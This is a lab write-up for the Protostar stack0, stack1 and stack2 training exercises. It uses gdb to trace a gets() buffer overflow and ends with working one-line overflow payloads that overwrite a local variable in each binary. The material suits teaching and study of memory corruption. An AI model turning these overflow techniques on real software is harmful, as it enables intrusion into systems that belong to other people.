# First Stack Buffer Overflow To Modify Variable - bin 0x0c

## Target Exercises

- [stack0](https://exploit-exercises.lains.space/protostar/stack0/)
- [stack1](https://exploit-exercises.lains.space/protostar/stack1/)
- [stack2](https://exploit-exercises.lains.space/protostar/stack2/)

## Usage

Download `exploit-exercises-protostar-2.iso` from the [Protostar Google Drive directory](https://drive.google.com/folderview?id=0B9RbZkKdRR8qbkJjQ2VXbWNlQzg&usp=sharing)

```
/bin/bash
/opt/protostar/bin/stack0
AAAA
```

## Instructions

Debug with `gdb`:
```
user@protostar:/opt/protostar/bin$ gdb stack0
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack0...done.
(gdb) break *main
Breakpoint 1 at 0x80483f4: file stack0/stack0.c, line 6.
(gdb) set disassembly-flavor intel
(gdb) run
Starting program: /opt/protostar/bin/stack0

Breakpoint 1, main (argc=1, argv=0xbffff814) at stack0/stack0.c:6
6	stack0/stack0.c: No such file or directory.
	in stack0/stack0.c
(gdb) disassemble main
Dump of assembler code for function main:
0x080483f4 <main+0>:	push   ebp
0x080483f5 <main+1>:	mov    ebp,esp
0x080483f7 <main+3>:	and    esp,0xfffffff0
0x080483fa <main+6>:	sub    esp,0x60
0x080483fd <main+9>:	mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:	lea    eax,[esp+0x1c]
0x08048409 <main+21>:	mov    DWORD PTR [esp],eax
0x0804840c <main+24>:	call   0x804830c <gets@plt>
0x08048411 <main+29>:	mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:	test   eax,eax
0x08048417 <main+35>:	je     0x8048427 <main+51>
0x08048419 <main+37>:	mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:	call   0x804832c <puts@plt>
0x08048425 <main+49>:	jmp    0x8048433 <main+63>
0x08048427 <main+51>:	mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:	call   0x804832c <puts@plt>
0x08048433 <main+63>:	leave
0x08048434 <main+64>:	ret
End of assembler dump.
(gdb)
```

Look at the mapped memory with:
```
(gdb) info proc mappings
process 1662
cmdline = '/opt/protostar/bin/stack0'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack0'
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack0
	 0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack0
	0xb7e96000 0xb7e97000     0x1000          0
	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
	0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
	0xb7fd9000 0xb7fdc000     0x3000          0
	0xb7fe0000 0xb7fe2000     0x2000          0
	0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
	0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
	0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
	0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
	0xbffeb000 0xc0000000    0x15000          0           [stack]
(gdb)
```

The stack begins at `0xbffeb000` and ends at `0xc0000000` (and grows from the bottom, at the highest address, so from `0xc0000000`). Technically speaking, `0xc0000000` does not belong to the stack so basically the stack starts at `0xc0000000-8` which is `0xbffffff8`.

Display the memory contents at `$esp` (as an he(x)adecimal (w)ord) with:
```
(gdb) x/wx $esp
0xbffff76c:	0xb7eadc76
```
Reference: http://visualgdb.com/gdbreference/commands/x

Clear all the breakpoints and define new ones just before and just after the call to `gets`. Also define a collection of commands to execute ievery time we hit a breakpoint ("hook") with:
```
(gdb) del
Delete all breakpoints? (y or n) y
(gdb) break *0x0804840c
Breakpoint 2 at 0x804840c: file stack0/stack0.c, line 11.
(gdb) break *0x08048411
Breakpoint 3 at 0x8048411: file stack0/stack0.c, line 13.
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>info registers
>x/24wx $esp
>x/2i $eip
>end
(gdb)
```

Run the program again with:
```
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack0
eax            0xbffff71c	-1073744100
ecx            0x43447579	1128559993
edx            0x1	1
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff700	0xbffff700
ebp            0xbffff768	0xbffff768
esi            0x0	0
edi            0x0	0
eip            0x804840c	0x804840c <main+24>
eflags         0x200286	[ PF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff700:	0xbffff71c	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffff710:	0xb7fd7ff4	0xb7ec6165	0xbffff728	0xb7eada75
0xbffff720:	0xb7fd7ff4	0x08049620	0xbffff738	0x080482e8
0xbffff730:	0xb7ff1040	0x08049620	0xbffff768	0x08048469
0xbffff740:	0xb7fd8304	0xb7fd7ff4	0x08048450	0xbffff768
0xbffff750:	0xb7ec6365	0xb7ff1040	0x0804845b	0x00000000
0x804840c <main+24>:	call   0x804830c <gets@plt>
0x8048411 <main+29>:	mov    eax,DWORD PTR [esp+0x5c]

Breakpoint 2, 0x0804840c in main (argc=1, argv=0xbffff814) at stack0/stack0.c:11
11	in stack0/stack0.c
(gdb)
```

The hook prints the registers, the stack and the next two instructions.

Now continue and enter a couple of A's:
```
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAA
eax            0xbffff71c	-1073744100
ecx            0xbffff71c	-1073744100
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff700	0xbffff700
ebp            0xbffff768	0xbffff768
esi            0x0	0
edi            0x0	0
eip            0x8048411	0x8048411 <main+29>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff700:	0xbffff71c	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffff710:	0xb7fd7ff4	0xb7ec6165	0xbffff728	0x41414141
0xbffff720:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff730:	0xb7ff0041	0x08049620	0xbffff768	0x08048469
0xbffff740:	0xb7fd8304	0xb7fd7ff4	0x08048450	0xbffff768
0xbffff750:	0xb7ec6365	0xb7ff1040	0x0804845b	0x00000000
0x8048411 <main+29>:	mov    eax,DWORD PTR [esp+0x5c]
0x8048415 <main+33>:	test   eax,eax

Breakpoint 3, main (argc=1, argv=0xbffff814) at stack0/stack0.c:13
13	in stack0/stack0.c
(gdb)
```

All the 0x41 are the A's we just entered.

Display the content of the address we check if it is 0 with:
```
(gdb) x/wx $esp+0x5c
0xbffff75c:	0x00000000
```

Meaning our A's are still a bit too far away. Let's count how much we need. There are 16 characters per row and we need 4 full rows to overwrite the content at 0xbffff75c => 64 characters. Run again with that many characters:
```
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack0
eax            0xbffff71c	-1073744100
ecx            0x6405642a	1678074922
edx            0x1	1
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff700	0xbffff700
ebp            0xbffff768	0xbffff768
esi            0x0	0
edi            0x0	0
eip            0x804840c	0x804840c <main+24>
eflags         0x200286	[ PF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff700:	0xbffff71c	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffff710:	0xb7fd7ff4	0xb7ec6165	0xbffff728	0xb7eada75
0xbffff720:	0xb7fd7ff4	0x08049620	0xbffff738	0x080482e8
0xbffff730:	0xb7ff1040	0x08049620	0xbffff768	0x08048469
0xbffff740:	0xb7fd8304	0xb7fd7ff4	0x08048450	0xbffff768
0xbffff750:	0xb7ec6365	0xb7ff1040	0x0804845b	0x00000000
0x804840c <main+24>:	call   0x804830c <gets@plt>
0x8048411 <main+29>:	mov    eax,DWORD PTR [esp+0x5c]

Breakpoint 2, 0x0804840c in main (argc=1, argv=0xbffff814) at stack0/stack0.c:11
11	in stack0/stack0.c
(gdb) c
Continuing.
AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIII
eax            0xbffff71c	-1073744100
ecx            0xbffff71c	-1073744100
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff700	0xbffff700
ebp            0xbffff768	0xbffff768
esi            0x0	0
edi            0x0	0
eip            0x8048411	0x8048411 <main+29>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff700:	0xbffff71c	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffff710:	0xb7fd7ff4	0xb7ec6165	0xbffff728	0x41414141
0xbffff720:	0x41414141	0x42424242	0x42424242	0x43434343
0xbffff730:	0x43434343	0x44444444	0x44444444	0x45454545
0xbffff740:	0x45454545	0x46464646	0x46464646	0x47474747
0xbffff750:	0x47474747	0x48484848	0x48484848	0x49494949
0x8048411 <main+29>:	mov    eax,DWORD PTR [esp+0x5c]
0x8048415 <main+33>:	test   eax,eax

Breakpoint 3, main (argc=1, argv=0xbffff814) at stack0/stack0.c:13
13	in stack0/stack0.c
(gdb)
```

Iterate a few times by changing the length of the string to identify the minimum length required. Check each time with:
```
(gdb) x/wx $esp+0x5c
0xbffff75c:	0x49494949
```

NOTE: Include that in `define hook-stop`?

Now single step forward and confirm you have modified the variable:
```
(gdb) c
Continuing.
you have changed the 'modified' variable

Program exited with code 051.
Error while running hook_stop:
The program has no registers now.
```

Without `gdb`:
```
(gdb) quit
user@protostar:/opt/protostar/bin$ python -c 'print "A"*(4+16*3+14)' | ./stack0
you have changed the 'modified' variable
```

Note that `4+16*3+14=66` while `65` also works. `modified` just needs to change, not be overwritten entirely. `64` is not enough though, as the buffer does not overflow.

Similarly:
- `stack1` can be solved with:
```
./stack1 $(python -c 'print("A"*64+"\x64\x63\x62\x61")')
```

- `stack2` can be solved with:
```
GREENIE=$(python -c 'print("A"*64+"\x0a\x0d\x0a\x0d")') ./stack2
```
